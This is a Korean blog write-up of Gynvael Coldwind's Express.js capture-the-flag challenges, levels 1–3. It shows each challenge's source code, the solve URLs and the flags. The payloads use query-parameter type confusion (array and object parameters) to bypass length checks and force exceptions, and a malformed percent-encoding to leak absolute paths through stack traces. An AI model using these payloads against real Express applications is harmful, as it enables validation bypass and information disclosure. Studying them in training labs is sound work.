---
layout: post
date: 2021-01-24 00:00:00
title: "Express Challenge Write Up (Gynvael Coldwind)"
categories: Express.js Challenge
tags: [Express.js]
author:
  - Jeongwon Jo
---
<strong>트위터에서 Gynvael Coldwind라는 분이 만든 Express Challenge 입니다.</strong><br>

---
### Challenge 1

```javascript
Level 1

const express = require('express')
const fs = require('fs')

const PORT = 5001
const FLAG = process.env.FLAG || "???"
const SOURCE = fs.readFileSync('app.js')

const app = express()

app.get('/', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')
  res.write("Level 1\n\n")

  if (!('secret' in req.query)) {
    res.end(SOURCE)
    return
  }

  if (req.query.secret.length > 5) {
    res.end("I don't allow it.")
    return
  }

  if (req.query.secret != "GIVEmeTHEflagNOW") {
    res.end("Wrong secret.")
    return
  }

  res.end(FLAG)
})

app.listen(PORT, () => {
  console.log(`Example app listening at port ${PORT}`)
}) 
```
<strong>Challenge 1의 솔브 조건을 확인해보면 Query String인 secret의 길이가 5 이상이면 안 되고, secret의 값이 `GIVEmeTHEflagNOW`여야 합니다. 하지만 해당 값은 길이가 16 이므로 5 이상이기 때문에 중간에 끊기게 됩니다.</strong><br>

```javascript
＞ var secret = ['GIVEmeTHEflagNOW'];
undefined
＞ secret.length
1
＞ if (secret == 'GIVEmeTHEflagNOW'){console.log(1);}
1
```
<strong> 하지만 Express.js는 Object로 Query String을 보내줄 수 있기 때문에 이를 이용해서 보내주면 길이는 1, secret의 값은 `GIVEmeTHEflagNOW`가 되므로 문제를 해결할 수 있습니다.</strong><br>

```
Solve Payload : http://challenges.gynvael.stream:5001/?secret[]=GIVEmeTHEflagNOW
```

`FLAG : CTF{SmellsLikePHP}`

---
### Challenge 2

```javascript
Level 2

const express = require('express')
const fs = require('fs')

const PORT = 5002
const FLAG = process.env.FLAG || "???"
const SOURCE = fs.readFileSync('app.js')

const app = express()

app.get('/', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')
  res.write("Level 2\n\n")

  if (!('X' in req.query)) {
    res.end(SOURCE)
    return
  }

  if (req.query.X.length > 800) {
    const s = JSON.stringify(req.query.X)
    if (s.length > 100) {
      res.end("Go away.")
      return
    }

    try {
      const k = '<' + req.query.X + '>'
      res.end("Close, but no cigar.")
    } catch {
      res.end(FLAG)
    }

  } else {
    res.end("No way.")
    return
  }
})

app.listen(PORT, () => {
  console.log(`Challenge listening at port ${PORT}`)
}) 
```
<strong>`req.query.X`의 길이는 800보다 커야 하고, `JSON.stringify(req.query.X)`의 값은 100보다 작아야 합니다. </strong><br>

```
Bypass Payload: http://challenges.gynvael.stream:5002/?X[length]=801
```
<strong>Express.js는 Object로 값을 보내줄 수 있다는 것을 알고 있습니다. 위 조건문은 위 Payload를 이용해서 쉽게 우회할 수 있습니다. </strong><br>

```javascript
  if (req.query.X.length > 800) {
    const s = JSON.stringify(req.query.X)
    if (s.length > 100) {
      res.end("Go away.")
      return
    }
```
<strong>`req.query.X.length`를 참조하면 801, `JSON.stringify()` 메서드를 이용해서 Query String을 문자열로 만들게 되면 길이가 길어봐야 35정도(최종 페이로드 기준) 될 것이기 때문에 쉽게 우회할 수 있습니다.</strong><br>

```javascript
    try {
      const k = '<' + req.query.X + '>'
      res.end("Close, but no cigar.")
    } catch {
      res.end(FLAG)
    }
```
<strong>try/catch 문을 보면 catch 문에서 flag를 출력해주는 것을 볼 수 있습니다. catch 문으로 가기 위해서는 try 문에서 에러를 내뱉게 해야 합니다. `const k = '<' + req.query.X + '>'`를 보면 문자열과 오브젝트 값을 더해주는 것을 볼 수 있습니다.</strong><br>

<strong>Object와 문자열을 더해주면 오브젝트 값을 암시적으로 문자열로 변환해주는 메서드를 호출한다고 합니다. Javascript에서는 문자열로 변환해주는 메서드는 toString() 입니다.</strong><br>

```javascript
＞ var a = {toString:''}
undefined
＞ secret.length
1
＞ const s = '<' + a + '>';
ⓧ ▶Uncaught TypeError: Cannot convert object to primitive value
      at <anonymous>:1:15
```
<strong>Object 값으로 toString으로 보내줬습니다. 그 다음 `const s = '<' + a + '>';`에서는 a 의 값이 Object이기 때문에 toString를 호출하게 됩니다. 이때 toString을 `a.toString` 이렇게 호출하게 되는데 a의 toString 값은 위에 보면 ''로 재정의  때문에 Object를 문자열로 변환해주지 못 해 에러가 발생하게 됩니다.</strong><br>

```
Solve Payload : http://challenges.gynvael.stream:5002/?X[length]=801&X[toString]
```

`FLAG : CTF{WaaayBeyondPHPLikeWTF}`

---
### Challenge 3

```javascript
Level 3

// IMPORTANT NOTE:
// The secret flag you need to find is in the path name of this JavaScript file.
// So yes, to solve the task, you just need to find out what's the path name of
// this node.js/express script on the filesystem and that's it.

const express = require('express')
const fs = require('fs')
const path = require('path')

const PORT = 5003
const FLAG = process.env.FLAG || "???"
const SOURCE = fs.readFileSync(path.basename(__filename))

const app = express()

app.get('/', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')
  res.write("Level 3\n\n")
  res.end(SOURCE)
})

app.get('/truecolors/:color', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')

  const color = ('color' in req.params) ? req.params.color : '???'

  if (color === 'red' || color === 'green' || color === 'blue') {
    res.end('Yes! A true color!')
  } else {
    res.end('Hmm? No.')
  }
})

app.listen(PORT, () => {
  console.log(`Challenge listening at port ${PORT}`)
})
```
<strong>위쪽에 디스크립션을 보면 flag는 javascript 파일이 위치한 경로 파일 이름으로 되어 있다고 합니다. 하지만 코드를 보면 알겠지만 Path Traversal 취약점이 발생할 만한 곳은 존재하지 않습니다.</strong><br>

```
TypeError: Cannot convert object to primitive value
    at /root/project/node_Project/shop/app.js:9:19
    at Layer.handle [as handle_request] (/root/project/node_Project/shop/node_modules/express/lib/router/layer.js:95:5)
    at next (/root/project/node_Project/shop/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/root/project/node_Project/shop/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/root/project/node_Project/shop/node_modules/express/lib/router/layer.js:95:5)
    at /root/project/node_Project/shop/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/root/project/node_Project/shop/node_modules/express/lib/router/index.js:335:12)
    at next (/root/project/node_Project/shop/node_modules/express/lib/router/index.js:275:10)
    at expressInit (/root/project/node_Project/shop/node_modules/express/lib/middleware/init.js:40:5)
    at Layer.handle [as handle_request] (/root/project/node_Project/shop/node_modules/express/lib/router/layer.js:95:5)
```
<strong>하지만 위에러를 보면 에러가 발생한 위치를 절대 경로로 알려주고 있는 것을 볼 수 있습니다. 그러니 해당 문제에서도 에러를 내뱉게만 하면 어디에서 에러가 났는 지 절대 경로로 보여줄 건데, 그때 경로에서 flag를 찾을 수 있을 것 입니다. (위 에러는 문제와 상관 없음)</strong><br>

<strong>이렇게 시나리오는 구성했지만 에러를 어디서 내뱉게 해야 할 지 몰라 삽질을 조금 많이 했습니다.</strong><br>

```javascript
app.get('/truecolors/:color', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')

  const color = ('color' in req.params) ? req.params.color : '???'
```
<strong>위 코드를 보면 값을 req.params를 이용해서 color의 값을 받아오는 것을 볼 수 있습니다.</strong><br>

![](https://github.com/wjddnjs33/image2/blob/main/aa.png?raw=true)
<strong>req.params에 대해 조금 찾아보니 req.params를 이용해서 값을 받으면, 자동으로 `decodeUriComponent()` 메서드를 이용해서 값을 디코딩한다고 합니다.</strong>

```javascript
try {
  var a = decodeURIComponent('%E0%A4%A');
} catch(e) {
  console.error(e);
}

// URIError: malformed URI sequence
```
<strong>MDN Web Docs에서 decodeURLComponent() 메서드를 확인해 보니 인자 값으로 위와 같은 값이 들어오면 에러를 내뱉는 다는 것을 알 수 있었습니다.</strong>

```javascript
＞ decodeURIComponent("%61");
"a"
＞ decodeURIComponent("%62");
"b"
＞ decodeURIComponent("%63");
"c"
＞ decodeURIComponent("%AA");
ⓧ ▶Uncaught URIError: URI malformed
    at decodeURIComponent (<anonymous>)
    at <anonymous>:1:1
(anonymous) @ VM208:1
＞ decodeURIComponent("%-");
ⓧ ▶Uncaught URIError: URI malformed
    at decodeURIComponent (<anonymous>)
    at <anonymous>:1:1
```
<strong>그래서 왜 에러가 나는 지 확인을 해보니 ascii code 범위를 벗어나 매칭 되는 값이 없어서 에러가 나는 거 같았습니다. %AA ~ %FF 이 외에도 여러가지 값들을 다 넣어보니 모두 에러가 나는 것을 확인했습니다.</strong><br>

```
URIError: Failed to decode param '%-'
    at decodeURIComponent (<anonymous>)
    at decode_param (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/layer.js:148:15)
    at matchLayer (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:574:18)
    at next (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:220:15)
    at expressInit (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/middleware/init.js:40:5)
    at Layer.handle [as handle_request] (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:317:13)
    at /usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/usr/src/app/CTF{TurnsOutItsNotRegexFault}/node_modules/express/lib/router/index.js:335:12)
```
<strong>그래서 color의 값으로 %-을 주니 에러가 났고, 예상대로 절대 경로 모두 출력됐고, 절대 경로 내에 flag가 있었습니다.</strong><br>

```
Solve Payload : http://challenges.gynvael.stream:5003/truecolors/%-
```

`FLAG : CTF{TurnsOutItsNotRegexFault}`

---
### Challenge 4

(Writing)

---
### Challenge 5

(Writing)

---
### Challenge 6

(Writing)

---
